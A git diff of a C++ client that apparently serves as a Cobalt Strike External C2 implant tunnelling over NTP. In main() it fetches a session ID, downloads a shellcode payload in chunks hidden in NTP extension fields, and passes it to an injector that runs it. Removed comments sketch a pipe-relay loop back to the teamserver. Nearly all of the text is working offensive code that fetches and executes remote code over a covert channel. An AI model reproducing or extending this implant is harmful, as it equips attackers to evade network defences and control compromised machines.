@@ -13,6 +13,9 @@ CS-EXTC2-NTP
 #include <vector>
 #include "injector.hpp"
 
+// ======================================
+// Chunker - may need some reword
+// ======================================
 std::vector<uint8_t> size_tToBytes(size_t value) {
 	std::vector<uint8_t> bytes(sizeof(size_t));
 	std::memcpy(bytes.data(), &value, sizeof(size_t));
@@ -107,10 +110,9 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 	return responseDataBuffer;
 }
 
-
-/*
-* helper to get payload 
-*/
+// ======================================
+// getFuncs
+// ======================================
 std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
 	//Create pcaket
 	auto packet = NTPPacket();
@@ -118,23 +120,10 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
 	std::vector<uint8_t> packetData = { 0x86 }; //packetData on giveMePayload asks for arch?
 	std::vector<uint8_t> zeroPacketData = { 0x00 }; //packetData on giveMePayload asks for arch?
 
-	//Chunking here to get the payload
-	//response from serer will be size, so need to get size, and chunk over that, and insert into payloadBuffer
-	//probably shoudln't use chunker here, or at least modify chunker to be a send only mechanism? I dunno
-	//std::vector<uint8_t> payloadBuffer = chunker(
-	//	packetData,
-	//	NtpExtensionField::giveMePayload,
-	//	Client::emptyClientId
-	//);
-	// 
-	// 
-	// 
-
-	//modified way of doing this.
-
-	//temp session id
-
+	// =============================================================
 	//1. Send a NtpExtensionField::giveMePayload packet. This returns size of inbound payload
+	// =============================================================
+
 	NTPPacket giveMePayloadPacketClass;
 	giveMePayloadPacketClass.addExtensionField(
 		NtpExtensionField::giveMePayload,
@@ -147,25 +136,12 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
 
 	//get size from packet
 	NTPPacketParser sizePacketParsererClass(responsePacket);
-
-
 	auto payloadSizeVector = sizePacketParsererClass.getExtensionData();
-
-	//clientid not in server responses atm,so manually extract. This was the bug
-	//std::vector<uint8_t> size;
-	//size.insert(size.begin(), payloadSizeVector.begin() + 56, payloadSizeVector.end());
-
-	//printHexVector(size);
-
-	//probelm here with size
-	//uint32_t payloadSize = vectorToUint32(payloadSizeVector);
 	uint32_t payloadSize = vectorToUint32(payloadSizeVector);
 
-	//uint32_t payloadSize = 0;
-	//std::memcpy(&payloadSize, responsePacket.data(), sizeof(payloadSize));
-	//uint32_t payloadSize = vectorToUint32(responsePacket.getPacket())
-
+	// =============================================================
 	//2. Iterate over size, and send a 0x00 (NtpExtensionField::giveMePayload) packet, until all data has been recieved.
+	// =============================================================
 
 	//create our packet first so we don't have to keep re-creating it
 	NTPPacket getMoreOfPayloadPacketClass;
@@ -174,8 +150,8 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
 		zeroPacketData,
 		clientId //placeholder until real id
 	);
-	std::vector<uint8_t> getMoreOfPayloadPacket = getMoreOfPayloadPacketClass.getPacket();
 
+	std::vector<uint8_t> getMoreOfPayloadPacket = getMoreOfPayloadPacketClass.getPacket();
 	std::vector<uint8_t> payloadBuffer;
 	std::cout << "Retrieveing payload of size " << payloadSize << std::endl;
 	uint32_t counter = 0;
@@ -197,7 +173,6 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
 
 	//3. This should now be the payload data. 
 	std::cout << "[+] Payload of size " << payloadBuffer.size() << " retrieved";
-
 	return payloadBuffer;
 }
 
@@ -216,7 +191,6 @@ std::vector<uint8_t> getId() {
 
 	NTPPacketParser responsePacketParser = NTPPacketParser(responsePacket);
 	//Get extension data:
-	//std::vector<uint8_t> extensionData = responsePacketParser.getExtensionClientId();
 	std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();
 
 
@@ -224,74 +198,18 @@ std::vector<uint8_t> getId() {
 }
 
 int main() {
-	//Stuff here
-
 	std::cout << "Started" << std::endl;
 
 	//0. Get Session ID from server
-	//std::cout << "[?] Session ID: ";
-	//printHexVector(getId());
 	std::vector<uint8_t> clientId = getId();
 
 	//1. Get Payload
 	std::vector<uint8_t> payloadBytes = getPayload(clientId);
 
 	//2. run payload
+	//bugs out here, is fine for now
 	injector(payloadBytes);
-	//3. read from pipe & send back
-	//sess id is here cuz it's per comm to track chunking
 
+	//3. read from pipe & start with chunk loop
 
 }
-
-
-
-//Note, have payload functino be simiar to above, but diff due to data coming back and needing to be retuend
-
-//void logic() {
-
-	//! Need a dedicated chunking function, that does the chunking logic,and just easily returns the response fromthe server
-
-	//3 seperate functions of how to do this now:
-
-	//GetPayload function(){};
-	//Create payload packet (giveMePayload)
-
-	//Send giveMePayload packet
-		// > Get size of payload from sizePacket
-		// > iterate over payload chunks until data = what was in size packet
-
-
-	//InjectPayload function();
-	//Injection method for running shellcode, go with basic injection method, with a thread.
-
-	//ReadPipe Function();
-	//attempt to read pipe
-		//	
-		//send data to teamserver: sendDataToTeamServer
-		//recieve data from teamserver with getDataFromTeamserver, in response
-
-	//attempt to write to pipe
-	//goto attempt to read pipe
-//}
-
-/*
-Next steps:
-
-// Standard data transfer
-
-Figure out chunking. Might be best to one func this, or class it. OneFunc may be easier short term 
- - Initial packet to say overall size (maybe extensionField of 0x51 0x33) //bad SIZE rep in hex: 0x51 0x23
-
- - After initial packet, wait for next packet, which will be first in data packets. Math can be done for how many packets to expect
-
- - After packets are done, return completed buffer (in a vector). That can get passed to whatever it needs to
-
-
- // Payload Retrieval
-
-Uses the same exact chunker as above, BUT, uses adiff header. Maybe '0x10 0xAD' for (pay)load
-
-Then call injection logic to run payload.
-
-*/
